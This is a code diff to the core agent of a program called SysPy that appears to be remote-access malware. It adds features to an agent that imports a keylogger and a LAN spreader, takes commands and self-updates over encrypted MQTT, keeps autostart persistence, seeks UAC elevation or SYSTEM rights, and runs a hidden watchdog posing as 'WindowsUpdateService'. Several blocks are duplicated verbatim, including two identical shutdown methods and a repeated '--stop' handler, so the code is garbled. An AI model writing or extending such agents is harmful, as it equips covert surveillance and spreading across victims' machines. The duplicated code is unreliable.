@@ -17,8 +17,11 @@ from .. import __version__, config, crypto, log, protocol, guardian
 from ..mqtt import MqttClient, random_client_id
 from ..lan.beacon import LanService
 from ..lan.spread import Spreader
-from . import commands, health, persistence, runtime, stealth, sysinfo, updater
+from . import (commands, health, persistence, runtime, session, stealth,
+               sysinfo, updater)
 from .inputs import Keylogger
+from . import machine_state
+from . import machine_state
 
 #: Concurrent command ceiling. A broadcast otherwise spawns one thread per
 #: message with no limit.
@@ -33,9 +36,13 @@ class Agent:
 
     def __init__(self) -> None:
         self.agent_id = config.agent_id()
-        master_key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
+        master_key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT,
+                                       config.KDF_ITERATIONS)
         self.key = crypto.subkey(master_key, self.agent_id)
-        self.codec = protocol.Codec(self.key)
+        self.codec = protocol.Codec(self.key, fmt=config.ENVELOPE_FMT)
+        # A pre-patch controller still speaks the legacy envelope. Decoding
+        # auto-detects, but we keep a dedicated codec for a clear audit trail.
+        self.legacy_codec = protocol.Codec(self.key, fmt=1)
         self.reassembler = protocol.Reassembler()
         self.health = health.Health()
 
@@ -57,6 +64,7 @@ class Agent:
         }
 
         self._log = log.get("core")
+        self._update_lock = threading.Lock()
         self._client: MqttClient | None = None
         self._connected = threading.Event()
         self._last_persistence_check = 0.0
@@ -121,6 +129,11 @@ class Agent:
             "id": self.agent_id,
             "name": self.hostname,
             "ver": __version__,
+            "build": getattr(__import__("syspy"), "BUILD_ID", __version__),
+            "proto": config.PROTOCOL_VERSION,
+            "fmt": config.ENVELOPE_FMT,
+            "session": session.current_session(),
+            "headless": session.is_headless(),
             "sha": self.self_sha,
             "path": self.bundle_entry,
             "pid": os.getpid(),
@@ -142,9 +155,12 @@ class Agent:
     # ------------------------------------------------------------------
 
     def _on_message(self, topic: str, payload: bytes) -> None:
-        try:
-            message = self.codec.decode(payload)
-        except Exception:
+        message = None
+        for codec in (self.codec, self.legacy_codec):
+            message, reason = codec.decode_message(payload)
+            if reason != protocol.REASON_BAD:
+                break
+        if message is None:
             return
 
         kind = message.get("t")
@@ -190,8 +206,20 @@ class Agent:
             if total > 3 and received % 5 == 0:
                 self.send({"t": "progress", "d": f"update {received}/{total}"})
             return
-        ok, detail = updater.apply(data, message.get("sha", ""))
-        self.reply(f"update {detail}" if ok else f"update failed: {detail}")
+        if not self._update_lock.acquire(blocking=False):
+            self.reply("update already in progress")
+            return
+        try:
+            self.reply("update: verifying")
+            ok, detail = updater.apply(data, message.get("sha", ""))
+            self.reply(f"update {detail}" if ok else f"update failed: {detail}")
+        except Exception as error:
+            self.reply(f"update failed: {error}")
+        finally:
+            try:
+                self._update_lock.release()
+            except RuntimeError:
+                pass
 
     # ------------------------------------------------------------------
     # Periodic workers
@@ -243,6 +271,9 @@ class Agent:
                 now = time.time()
                 if now - self._last_persistence_check > 30:
                     self._last_persistence_check = now
+                    if session.should_yield() and session.yield_to_interactive(5.0):
+                        self._log.info("handing over to the interactive session")
+                        self.shutdown(0)
                     actions = persistence.ensure() + guardian.ensure()
                     if actions:
                         self._log.info("persistence: %s", ", ".join(actions))
@@ -290,8 +321,9 @@ class Agent:
                     will_topic=config.topic_up(self.agent_id),
                     will_payload=self.codec.encode({"t": "bye"}),
                 )
-                client.subscribe(config.topic_down(self.agent_id), qos=1)
                 self._client = client
+                if not client.subscribe(config.topic_down(self.agent_id), qos=1):
+                    self.send({"t": "note", "d": "broker did not SUBACK the downlink topic"})
                 self._connected.set()
                 self.send({"t": "note", "d": f"connected via {host}:{port}"})
                 return True
@@ -337,6 +369,54 @@ class Agent:
 
     def stop(self) -> None:
         self._running = False
+
+    def shutdown(self, code: int = 0) -> None:
+        """Disconnect cleanly, drop the lock, then exit.
+
+        A bare ``os._exit`` from a worker thread skipped ``finally`` blocks and
+        left stale locks behind. The MQTT will already covers the offline blip
+        on an update, so a real DISCONNECT is the correct goodbye everywhere
+        else.
+        """
+        self._running = False
+        try:
+            if self._client is not None:
+                self._client.publish(
+                    config.topic_up(self.agent_id),
+                    self.codec.encode({"t": "bye"}), qos=0)
+                time.sleep(0.15)
+                self._client.disconnect()
+        except Exception:
+            pass
+        try:
+            stealth.release_single_instance()
+        except Exception:
+            pass
+        os._exit(code)
+
+    def shutdown(self, code: int = 0) -> None:
+        """Disconnect cleanly, drop the lock, then exit.
+
+        A bare ``os._exit`` from a worker thread skipped ``finally`` blocks and
+        left stale locks behind. The MQTT will already covers the offline blip
+        on an update, so a real DISCONNECT is the correct goodbye everywhere
+        else.
+        """
+        self._running = False
+        try:
+            if self._client is not None:
+                self._client.publish(
+                    config.topic_up(self.agent_id),
+                    self.codec.encode({"t": "bye"}), qos=0)
+                time.sleep(0.15)
+                self._client.disconnect()
+        except Exception:
+            pass
+        try:
+            stealth.release_single_instance()
+        except Exception:
+            pass
+        os._exit(code)
 
 
 def main(argv: list[str] | None = None) -> int:
@@ -394,30 +474,70 @@ def main(argv: list[str] | None = None) -> int:
         print("Done.")
         return 0
 
+    if "--stop" in argv:
+        print("Stopping SysPy agent (autostart vectors kept)...")
+        for action in persistence.stop():
+            print(f"  [x] {action}")
+        print("Done. The agent returns at the next logon.")
+        return 0
+
+    if "--stop" in argv:
+        print("Stopping SysPy agent (autostart vectors kept)...")
+        for action in persistence.stop():
+            print(f"  [x] {action}")
+        print("Done. The agent returns at the next logon.")
+        return 0
+
     if "--install" in argv:
         print("\n".join(persistence.install()))
         return 0
 
-    # Elevate at most once per boot. Six autostart vectors fire together at
-    # logon; without the claim each one raised its own UAC prompt before the
-    # mutex was ever consulted.
+    # ------------------------------------------------------------------
+    # Order matters. Everything below happens before a single UAC decision.
+    #
+    # 1. An agent already alive? Leave, without touching UAC. This is the
+    #    check that used to be missing: the global mutex is visible across
+    #    sessions and elevation boundaries, so a sibling launcher notices an
+    #    elevated agent it could never have seen through the pid file.
+    # 2. A headless (session 0) agent with a user logged on? Hand the lock to
+    #    the interactive ONLOGON task and leave, so the desktop works.
+    # 3. Only then consider elevating, at most once per boot.
+    # ------------------------------------------------------------------
+    if not takeover and stealth.agent_already_running():
+        log.get("core.boot").info("agent already running, standing down")
+        return 0
+
+    if not takeover and session.should_yield():
+        if session.yield_to_interactive():
+            log.get("core.boot").info("handed over to the interactive session")
+            return 0
+
+    # A session-0 agent is already SYSTEM, so it never needs to elevate.
     want_elevate = (
         stealth.IS_WINDOWS
         and not stealth.is_admin()
+        and not session.is_headless()
         and os.environ.get("SYSPY_NO_UAC") != "1"
         and "--no-elevate" not in argv
     )
     if want_elevate:
         if stealth.claim_boot():
             log.get("core.boot").info("boot claim won, requesting elevation")
-            if stealth.elevate_process(argv):
+            if stealth.elevate_process(list(argv) + ["--takeover", str(os.getpid())]):
                 return 0
-            log.get("core.boot").warning("elevation declined or failed, running unelevated")
+            log.get("core.boot").warning("elevation declined, running unelevated")
         else:
-            time.sleep(random.uniform(1.5, 4.0))
+            # Wait for the winner rather than racing it. A UAC prompt can take
+            # a while; if it never resolves we degrade to unelevated, which is
+            # still fully functional, just without HKLM/SYSTEM/ACL vectors.
             log.get("core.boot").info("boot claim lost, waiting for the elevated instance")
+            deadline = time.time() + config.BOOT_WAIT
+            while time.time() < deadline:
+                if stealth.agent_already_running():
+                    return 0
+                time.sleep(0.4)
 
-    if stealth.acquire_single_instance(takeover):
+    if stealth.acquire_single_instance(takeover, prefer_interactive=True):
         return 0
 
     stealth.set_console_title(f"{config.PRODUCT_DESCRIPTION} ({config.PRODUCT_NAME})")
@@ -459,6 +579,8 @@ def _watchdog_main() -> int:
     stealth.write_pid(lock, os.getpid())
     stealth.set_console_title("WindowsUpdateService (watchdog)")
     stealth.hide_console()
+    yielded = False
+    yielded = False
 
     entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
 
@@ -477,10 +599,26 @@ def _watchdog_main() -> int:
 
         owner = stealth.read_pid(stealth.lock_path())
         if owner and stealth.process_alive(owner):
+            yielded = False
             continue
+
+        # Nothing is running. If we are headless and a user is logged on, the
+        # interactive task is the better place to be, so ask it first and only
+        # spawn a session-0 copy if it never turns up.
+        if session.should_yield():
+            if session.run_task(config.TASK_NAME):
+                time.sleep(8)
+                owner = stealth.read_pid(stealth.lock_path())
+                if owner and stealth.process_alive(owner):
+                    yielded = True
+                    continue
+            if yielded:
+                time.sleep(10)
+                continue
+
         try:
             command = [entry] if entry.lower().endswith(".exe") else [runtime.interpreter(), entry]
-            subprocess.Popen(command + ["--hidden"], close_fds=True,
+            subprocess.Popen(command + ["--hidden", "--no-elevate"], close_fds=True,
                              creationflags=0x00000200 if os.name == "nt" else 0)
         except OSError:
             pass
